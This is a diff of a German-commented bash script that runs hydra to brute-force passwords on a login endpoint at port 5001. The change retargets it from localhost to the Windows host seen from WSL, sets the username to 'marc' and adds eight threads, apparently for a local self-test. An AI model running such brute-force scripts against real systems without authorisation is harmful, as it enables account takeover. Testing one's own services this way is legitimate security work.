@@ -9,9 +9,10 @@
 # ============================================
 
 # Konfiguration
-TARGET="127.0.0.1"
+# Automatisch die Windows-IP aus WSL ermitteln
+TARGET=$(ip route | grep default | awk '{print $3}')
 PORT="5001"
-USERNAME="admin"                    # Zu testender Benutzername
+USERNAME="marc"                    # Zu testender Benutzername
 PASSWORD_FILE="passwords.txt"       # Passwortliste
 
 # Login-Endpunkt und Parameter
@@ -36,6 +37,7 @@ echo ""
 
 hydra -l "${USERNAME}" \
       -P "${PASSWORD_FILE}" \
+      -t 8 \
       -V \
       -f \
       "${TARGET}" \
